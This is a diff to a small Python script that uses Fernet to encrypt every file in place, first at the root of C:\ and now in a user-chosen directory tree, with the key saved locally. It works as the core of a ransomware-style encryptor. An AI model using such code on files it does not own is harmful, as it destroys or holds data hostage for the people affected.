@@ -5,27 +5,31 @@ from cryptography.fernet import Fernet
 # created by Youssef/dark-lime-0
 
 def main()->None:
-    files=[]
-    for file in os.listdir('C:\\'):
-            if file == 'enc_file.py' or file =="thekey.key" or file == 'dec_file.py':
+    files_to_enc=[]
+    try:
+        dir = input("specify a dir to encrypt : ")
+        for root, dirs, files in os.walk(dir):
+            for file in files :
+                if file in ['enc_file.py', 'thekey.key', 'dec_file.py']:
                     continue
-            if os.path.isfile(file):
-                    files.append(file)
-    print(files)
-    key = Fernet.generate_key()
+                file_path = os.path.join(root, file)
+                if os.path.isfile(file_path):
+                    files_to_enc.append(file_path)
 
-    with open("thekey.key", 'wb') as thekey:    # save the decryption key into a file
-        thekey.write(key)
+        key = Fernet.generate_key()
+        with open("thekey.key", 'wb') as thekey:    # save the decryption key into a file
+            thekey.write(key)
 
-    for file in files :                         # encrypt the files
-        with open(file,'rb') as thefile:
-            containts = thefile.read()
-        enc_data = Fernet(key).encrypt(containts)
-        with open(file, 'wb') as thefile :
-            thefile.write(enc_data)
+        for file in files_to_enc :                         # encrypt the files
+            with open(file,'rb') as thefile:
+                containts = thefile.read()
+            enc_data = Fernet(key).encrypt(containts)
+            with open(file, 'wb') as thefile :
+                thefile.write(enc_data)
 
-    print("Encryption Completed successfully !!")
-
+        print("Encryption Completed successfully !!")
+    except Exception as e:
+        print(f"Error: {e}. Please try again!")
 if __name__=='__main__':
     main()
 
